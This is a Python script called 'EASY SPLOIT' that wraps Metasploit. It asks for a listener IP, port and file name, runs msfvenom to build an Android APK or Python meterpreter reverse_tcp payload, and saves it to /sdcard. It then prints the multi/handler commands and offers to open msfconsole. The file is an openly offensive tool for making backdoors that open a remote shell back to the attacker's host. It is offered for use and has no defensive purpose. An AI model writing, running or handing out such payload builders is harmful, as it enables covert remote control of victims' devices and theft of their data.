from os import system as s
import time
import sys
def slowtype(t):
   for D in t + "\n":
        sys.stdout.write(D)
        sys.stdout.flush()
        time.sleep(6/100)
s("clear")
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
PU = "\033[2;35m" #purple
print(R+"""
                uu$$$$$$$$$$$uu
             uu$$$$$$$$$$$$$$$$$uu
            u$$$$$$$$$$$$$$$$$$$$$u
           u$$$$$$$$$$$$$$$$$$$$$$$u
          u$$$$$$$$$$$$$$$$$$$$$$$$$u
          u$$$$$$$$$$$$$$$$$$$$$$$$$u
          u$$$$$$“   “$$$“   “$$$$$$u
          “$$$$“      u$u       $$$$“
           $$$u       u$u       u$$$
           $$$u      u$$$u      u$$$
            “$$$$uu$$$   $$$uu$$$$“
             “$$$$$$$“   “$$$$$$$“
               u$$$$$$$u$$$$$$$u
                u$“$“$“$“$“$“$u
     uuu        $$u$ $ $ $ $u$$       uuu
    u$$$$        $$$$$u$u$u$$$       u$$$$
     $$$$$uu      “$$$$$$$$$“     uu$$$$$$
   u$$$$$$$$$$$uu    “““““    uuuu$$$$$$$$$$
   $$$$“““$$$$$$$$$$uuu   uu$$$$$$$$$“““$$$“
    “““      ““$$$$$$$$$$$uu ““$“““
              uuuu ““$$$$$$$$$$uuu
     u$$$uuu$$$$$$$$$uu ““$$$$$$$$$$$uuu$$$
     $$$$$$$$$$““““           ““$$$$$$$$$$$“
      “$$$$$“                      ““$$$$““
        $$$“                         $$$$“""")
print ("")
slowtype (R+"WELCOM TO EASY SPLOIT")
print ("")
print ("You Can Make Paylod and Sploit  py MetaSploit")
print ("")
print (GG+"Now Make Paylod")
A1 = input ("Enter LHOST : ")
A2 = input ("Enter LPORT : ")
A3 = input ("Enter Payload Kind <1> apk <2> py : ")
A4 = input ("ENTER Payload NAME : ")
if A3 == ("1"):
        s("msfvenom -p android/meterpreter/reverse_tcp LHOST="+A1+" LPORT="+A2+" R > /sdcard/"+A4+".apk")
        print ("\033[34m[*] Payload was save in /sdcard")
        print("")
        print (RR+"""
use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST (Your IP)

set LPORT 4444

run""")
        print (PU+"Copy all commands and past in metasploit ")
        print ("Open MetaSploit ?")
        p3 = input ("y or n : ")
        if p3 == "y" :
                s("msfconsole")
        if p3 == "n" :
                s("exit")
elif A3 == ("2"):
        s("msfvenom -p python/meterpreter/reverse_tcp LHOST="+A1+" LPORT="+A2+" R > /sdcard/"+A4+".py")
        print(PU+"[*] Payload was save in /sdcard")
        print (RR+"""
use exploit/multi/handler

set payload python/meterpreter/reverse_tcp

set LHOST (Your IP)

set LPORT 4444

run""")
        print (PU+"Copy all commands and past in metasploit ")
        print ("Open MetaSploit ?")
        p3 = input ("y or n : ")
        if p3 == "y" :
                s("msfconsole")
        if p3 == "n" :
                s("exit")
else:
        exit()
